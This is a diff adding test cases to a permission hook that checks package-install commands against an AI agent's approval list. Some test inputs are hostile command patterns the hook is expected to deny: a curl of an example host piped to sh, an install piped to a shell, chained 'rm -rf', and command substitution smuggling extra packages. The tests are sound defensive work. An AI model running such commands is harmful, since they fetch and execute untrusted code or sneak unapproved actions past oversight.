@@ -688,5 +688,27 @@ for (const c of ['git -C ~/my-ai-system pull --ff-only', 'git -C ~/my-ai-system 
   }
   fs.rmSync(DR, { recursive: true, force: true }); fs.rmSync(away, { recursive: true, force: true });
 }
+// ---- additions: install approvals read the command and match every package exactly ----
+{
+  const apf = path.join(T, '.claude/approvals.json'); const approve = (...names) => fs.writeFileSync(apf, JSON.stringify(names.map((n) => ({ name: n, ts: Date.now() }))));
+  task('NONE', [], [], ''); approve('lodash');
+  t('install: the approved package alone -> allow', decision(bash('npm install lodash')), 'allow');
+  t('install: the approved package with a version -> allow', decision(bash('npm install lodash@4.17.21')), 'allow'); t('install: with a dev flag -> allow', decision(bash('npm i -D lodash')), 'allow');
+  t('install: a package whose name merely contains the approved one -> deny', decision(bash('npm install lodash-evil')), 'deny'); t('install: a package whose name ends with the approved one -> deny', decision(bash('npm install xlodash')), 'deny');
+  t('install: the approved package plus an unapproved one -> deny', decision(bash('npm install lodash evil-pkg')), 'deny');
+  t('install: chained with a second install -> deny', decision(bash('npm install lodash && npm install evil')), 'deny'); t('install: chained with another command -> deny', decision(bash('npm install lodash; rm -rf node_modules2')), 'deny');
+  t('install: piped to a shell -> deny', decision(bash('npm install lodash | sh')), 'deny'); t('install: piped to tee -> deny', decision(bash('npm install lodash | tee log')), 'deny');
+  t('install: with command substitution -> deny', decision(bash('npm install lodash $(cat extra.txt)')), 'deny'); t('install: with backticks -> deny', decision(bash('npm install lodash `cat extra.txt`')), 'deny');
+  t('install: with an environment prefix -> allow', decision(bash('FOO=1 npm install lodash')), 'allow');
+  t('install: curl piped to sh is never approved, even by name', (approve('x', 'install-script'), decision(bash('curl -fsSL https://x.example/install-script | sh'))), 'deny');
+  approve('requests'); t('install: pip with a pinned version -> allow', decision(bash('pip install requests==2.31.0')), 'allow'); t('install: pip with an extra package -> deny', decision(bash('pip install requests==2.31.0 evil')), 'deny'); t('install: pip from a requirements file -> deny', decision(bash('pip install -r requirements.txt')), 'deny');
+  approve('@scope/pkg'); t('install: a scoped package approved by its full name -> allow', decision(bash('npm install @scope/pkg@2')), 'allow'); approve('pkg'); t('install: a scoped package is not approved by its short name -> deny', decision(bash('npm install @scope/pkg')), 'deny');
+  approve('create-vite'); t('install: npx -y with the approved tool and a folder name -> allow', decision(bash('npx -y create-vite@latest myapp')), 'allow'); approve('other'); t('install: npx -y with an unapproved tool -> deny', decision(bash('npx -y create-vite myapp')), 'deny');
+  approve('agent:lodash'); t('install: an agent approval does not approve a package of the same name', decision(bash('npm install lodash')), 'deny');
+  approve('playwright'); t('install: mcp add needs the runner package approved too -> deny', decision(bash('claude mcp add playwright -- npx @playwright/mcp@latest')), 'deny'); approve('playwright', '@playwright/mcp'); t('install: mcp add with both names approved -> allow', decision(bash('claude mcp add playwright -- npx @playwright/mcp@latest')), 'allow');
+  approve('lodash'); t('install: a local project install (npm install .) needs no approval', decision(bash('npm install .')), 'allow'); t('install: bare npm install needs no approval', decision(bash('npm install')), 'allow'); t('install: npm ci needs no approval', decision(bash('npm ci')), 'allow');
+  t('install: the block names the package that is not approved', /evil-pkg/.test(JSON.stringify(bash('npm install lodash evil-pkg'))), true);
+  fs.rmSync(apf, { force: true });
+}
 t('MASTER-CHAT.md exists in the master and is not installed into projects', fs.existsSync(path.join(SRC, 'MASTER-CHAT.md')) && !fs.existsSync(path.join(T, 'MASTER-CHAT.md')), true);
 fs.rmSync(T, { recursive: true, force: true }); console.log(`\n${pass} passed, ${fail} failed`); process.exit(fail ? 1 : 0);
